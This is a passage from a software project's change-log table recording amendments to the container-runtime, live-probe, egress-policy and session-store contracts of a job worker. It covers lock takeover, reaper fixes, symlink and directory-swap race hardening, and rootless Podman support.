worker/test/start-wiring.test.mjs. |
...
| 2026-09-15 | Issue #344. **INT-LIVE-PROBE-CONTRACT AMENDED**: four kinds of container, one phase each, removed at the end of their phase -- the reading container, the pinning run, an ephemeral pair (two runs under one name, each waited on with `ps -a --no-trunc --filter id=` against a 10 s deadline) and, only with the policy armed and the proxy not seen down, two peers each on its own `--internal` job network built and removed by the job path's `createJobNetworkWith` and `removeJobNetworkWith`; names for every kind and the peer networks; one ownership list and a `finally` removing containers, then networks, then the fixture, never a container seen gone; a network owned before its create, and a removal that fails a ⚠ unless the daemon says the network is `not found`; the sweep now covers every container kind and the peer networks (left alone while a live-probe container is attached, otherwise every endpoint detached and named, never `network rm -f`, and one that stays a ⚠; a run in another PID namespace between its network create and its peer start is not protected, and reads not read back, or keeps its network without the proxy); the `ephemeral` read (a held name is the daemon's own `already in use` words; Podman's `stopped` is stopped) and the `jobToJobIsolation` read (a control on peer2's own addresses before AND after peer1's attempt answering at every address, at least one address required, plain words only) with their causes and what is not read back; the announcement is "before the first docker command after the endpoint re-read"; the `egress` bullet's reason is the allowlist and a provider, now that this module builds job networks too; Acceptance for both. **INT-EGRESS-POLICY-CONTRACT AMENDED**: a row for the live-probe peer networks. **INT-CONTAINER-RUNTIME-CONTRACT and INT-SANDBOX-CONTRACT UNCHANGED, checked**: the job and sandbox paths build their networks through the same functions, delegated, with identical commands. |
...
| 2026-09-21 | Issue #336, part 3a: the transcript's in-flight copy is named per writer. **`INT-SESSION-STORE-CONTRACT` AMENDED**: the key directory's file enumeration, described as closed, gains the `current.jsonl.<pid>.<n>.incoming` transient, and the write path states the rule and its asymmetry. This is a PRECONDITION for the stale-lock takeover rather than hardening: a fixed tmp name was self-cleaning while the per-key lock guaranteed one writer, and the takeover concedes a window with two, at which point a shared path means one writer's unlink removes the other's in-flight copy and whichever renames second can put a half-written transcript at the canonical path -- an agent handed a truncated conversation that no gate can see. `triggers-file.mjs` learned the same thing on `triggers.json`. The sidecar temps deliberately keep the shared name, because their worst case under a concurrent writer reads back as `null` and cold-starts, which this store already treats as safe, where the transcript's worst case does not. What the suite can pin is the NAME: `copyFileSync` is synchronous, so two writers in ONE process are never mid-copy together, and the interleaving this prevents is between two PROCESSES sharing a store, stated in the test rather than claimed. **Code evidence**: worker/src/session-store.mjs -> promoteSession, tmpSeq. |
| 2026-09-21 | Issue #336, part 3b: a leaked promotion lock is recovered. **`INT-SESSION-STORE-CONTRACT` AMENDED**: the killed-in-the-lock clause said such a key stayed locked until the file was removed by hand, and named the two shapes the reaper could never reach (a key whose FIRST promotion died before any transcript landed, so there is no mtime to key on, and `PI_SESSIONS_TTL_DAYS=0`, under which the reaper does not run at all). The next promotion now takes over a lock older than one hour, once, on `triggers-file.mjs`'s precedent, with the age on its own `session_lock_stale_taken` line logged only after the retake CREATE succeeded, because a rival sweeper can win the recreate race and a takeover line for a lock this process does not hold would send an operator reading a history that never happened. The threshold is an ASSERTION ABOUT STORAGE rather than a derivation, since `PI_SESSION_MAX_BYTES=0` is supported and leaves no bound to derive from, and it is generous because the asymmetry is: too short steals a LIVE writer's lock, where too long only delays recovery on a key nobody is watching. The age is read with `lstat` rather than `stat`, which the injected fs does not even carry, and that also unwedges a DANGLING link planted at the lock name, which an exclusive create refuses with EEXIST forever. `locked` now means EEXIST and a lock younger than the bound. Two residuals are stated rather than closed, both needing a takeover first: the release unlinks by PATH, so after one the original holder's release deletes the new holder's lock, and a takeover on a key two venues share can leave one venue's transcript under the other's stamp. A takeover was chosen over a reaper change as the PRIMARY fix precisely because it works under TTL 0, where a reaper cannot. **`REQ-RESUMABLE-SESSION` AMENDED** in the same spirit: one writer per key, and a dead writer does not keep it. **Code evidence**: worker/src/session-store.mjs -> takeLock, LOCK_STALE_MS. |
| 2026-09-21 | Issue #336, part 4: the reaper's blind spot, and the ownership this contract assumes. **`INT-SESSION-STORE-CONTRACT` AMENDED**, two bullets. The reaper keyed on the transcript's mtime ALONE, so a key whose first promotion died before the swap had nothing to key on and was logged-and-skipped on every pass forever, which is what let anything leaked inside it outlive the store. It now falls back to the key DIRECTORY's own mtime, on ENOENT alone: an EIO or an EACCES means the reaper could not ASK, and a reaper that reads "could not ask" as "old" deletes on a transient fault. Only a real directory is a key. The symlink guard's reason is MEASURED rather than assumed, because the obvious reading is wrong and a first version of its test passed with the guard removed: `rmSync` with recursive and force does not follow a link, so a link's TARGET was never at risk -- on a dangling link it silently does nothing, and on a link to a real directory it removes the link and leaves the target; what the guard actually prevents is the reaper unlinking an operator's own symlink out of the store once the LINK's own mtime ages out. `PI_SESSIONS_TTL_DAYS=0` is deliberately UNCHANGED and still sweeps nothing: it is an explicit operator instruction, and what makes a wedged key recoverable there is part 3b's takeover, not this. A second bullet states which OWNERSHIP the lock, the takeover and the reaper assume, and names the one file the worker does not own -- the per-job `/session/current.jsonl`, written by the job user inside the container and only ever READ here -- together with the unmeasured rootless-Podman case and the fact that its symptom would be a bounded, named promotion refusal rather than a corrupt store. **`OQ-037` UNCHANGED, checked**: rootless Podman is still refused, and this states what the store would assume if it were not. **Code evidence**: worker/src/session-store.mjs -> reapSessions. |
| 2026-09-22 | Issue #336, the review rounds. **`INT-SESSION-STORE-CONTRACT` AMENDED** by the gate rather than by a new part, which is why it gets its own row: parts 1 to 4 each carried one, and the corrections below amended the entry BODY across two commits with none. The link guarantee now says plainly that it is about the NAMES inside a key directory and not about the directory itself, which is a gap rather than a coverage claim (issue #375). The transcript temp's enumeration entry carries the random segment the per-writer name gained, and the temps are described by ONE clearing rule instead of a choice between `unlinkSync` and `rmSync`, because that choice was got wrong twice in opposite directions: `unlink` alone cannot take a DIRECTORY planted at a temp name, which wedged every promotion at the fatal venue sentinel, and `rmSync` alone does not remove a DANGLING link, which let the next write follow the survivor. The killed-in-lock clause is past tense where it describes what this issue refuted. The identity re-check states that it catches a SWAP, which is what a promotion performs, and not a rewrite in place that restores size and mtime; and inode reuse is recorded as a residual on filesystems that recycle rather than a general one, having proved unreproducible on APFS. The takeover's cost when it is wrong is stated: two holders both report `promoted`, one run's turns are discarded and the chain counter is incremented twice; its residuals gain the check-then-act unlink, the lock's mtime being its CREATE time, and a FUTURE mtime that never ages, which under TTL 0 is a wedge nothing clears. The reaper bullet states what the fallback widens: anything an operator left in a transcript-less key directory goes with it, and the lockless-sweep race reaches any long-lived such key. Acceptance gains the four cases the parts added, and one of them was corrected here after being added FALSE: a failed `pi-version` write cold-starts the next job only where this one cold-started, since a stamp that already matched stays true of the transcript beside it. **Code evidence**: worker/src/session-store.mjs -> removeTemp. |
...
| 2026-09-22 | Issue #375, and the review rounds that followed it. **`INT-SESSION-STORE-CONTRACT` AMENDED**, and it REVERSES a paragraph this contract added one round earlier: that the lstat-per-name guarantee was about the NAMES INSIDE a key directory and that the directory itself was out of scope. It is in scope now. Both edges lstat the key's own name and refuse anything that is not a real directory with the new token `key-not-a-directory`; the entry is left alone rather than swept; and the reaper judges nothing through a link, saying `session_not_reaped {key, reason}` where it used to resolve through one and remove it. The read path also stages the transcript from ONE DESCRIPTOR and re-checks the name after it, which is two different answers to two different swaps and neither subsumes the other: the descriptor closes the A, B, A across the copy that this entry used to state as a residual (23 of 654 resumes staged an attacker's transcript before, 0 of 115 after, 90 seconds each side of one harness), and the by-path re-check closes a swap landing before the OPEN, which the descriptor agrees with because every gate above it ran by path. Both were found by removing one and measuring. The write path cannot take the same medicine (Node exposes no `renameat`), so it compares the key directory's `dev:ino` under the lock and again after the swap: the first closes the check-to-lock segment, the second reports a later swap that is STILL STANDING when it runs; an A, B, A that puts the real directory back first still returns `promoted: true` for a transcript that landed outside the store, and the write edge has no answer to it. **`INT-RUN-HISTORY-FILE-CONTRACT` AMENDED**: the closed enum and both producer rows; the enum span and the operator page's two tables are now DERIVED from `SESSION_REASONS` by `worker/test/session-reasons.test.mjs`, after an invented token was shown to survive the whole suite, while the producer rows stay hand-written and are pinned by NOTHING, which is stated here rather than left to be assumed. Residuals stated rather than closed: a real directory pre-created by another user passes (no ownership check, because a shared store or a second worker uid would cold-start every key, and Windows has no uid); the promote window after the last check is unbounded, costing the transcript and four sidecars outside the store plus a lock stranded in the real key until the staleness takeover; and a takeover's release still unlinks by path. **`INT-CONTAINER-JOB-INPUTS` UNCHANGED, checked**. **Code evidence**: `worker/src/session-store.mjs` -> `inspectKeyDir`, `ensureKeyDir`, `copyFromDescriptor`; `worker/src/run-history.mjs` -> `SESSION_REASONS`. |
...
| 2026-09-25 | Issue #354, part 1 (the seams). **`INT-CONTAINER-RUNTIME-CONTRACT` AMENDED**: the container spec gains `userns` (`null` or `"keep-id"`); the docker builder refuses anything but `null`, so a `local` argv is byte-identical, and a Podman builder emits `--userns=keep-id` after `--user=` and refuses a spec without both (measured on rootless Podman 5.8.1: keep-id with no `--user` runs as the image's user and cannot read a `0700` `/job`). The job path's runtime binary is a seam, `docker` by default. No venue builds with the Podman builder yet; the backend that does is part 2. The output parsers that read a runtime's answers now admit Podman's (network inspect's lowercase `name`, failing closed on a member with neither key; `image not known` as an absent image; a disconnect's "is not connected to network" never read as the network being gone), measured on Podman 5.8.1. `INT-LIVE-PROBE-CONTRACT` AMENDED: the imagePinning read-back also accepts Podman's absent-image words and treats its pull announcement as a pull (the probes take the same seams, and their argv on `local` is unchanged); `INT-SANDBOX-CONTRACT` UNCHANGED, checked. |
| 2026-09-25 | Issue #354, part 2 (the `podman` venue). **`INT-LIVE-PROBE-CONTRACT` AMENDED**: one bullet and one Acceptance sentence. The native venue reads back through the same module, with the `podman` CLI as runner, `buildPodmanRunArgs` as the builder of all four container kinds, `serviceIsRemote === false` as the local gate (asked again before the first command), and the venue's own job user, so every probe carries `--user=` then `--userns=keep-id` and nothing runs where that decision refuses a job; the verdicts are unchanged, their docker-named details name the runtime they ran on, and their wording on `local` is byte-identical. `egress` is not read back on this venue by doctor, whose canary runs on docker only, and it says so; `.github/scripts/podman-conformance.mjs` hands the same verdicts, with a canary of its own, to the harness as its `readBack`. **`INT-CONTAINER-RUNTIME-CONTRACT` AMENDED**, one sentence: part 1's "no venue builds with it yet" now names the venue that does and what it passes (the worker's own `--user`, always, then `--userns=keep-id`, `HOME=/home/pi`, `relabel` from `podman info`). **UNCHANGED, checked**: `INT-SANDBOX-CONTRACT` (still local-only; a run on the podman venue is refused by name), `INT-RUNNER-EXIT-CODE-PROTOCOL` (the integers and their meanings; the attached exit 1 of a never-started container is a residual `DES-PODMAN-NATIVE-ROOTLESS-BACKEND` names, retried and not refunded), `INT-EGRESS-POLICY-CONTRACT` (the same flags; the proxy runs under the same rootless Podman) and `INT-SESSION-STORE-CONTRACT` (the venue stamp records `podman`; an unstamped transcript still reads as `local`). |
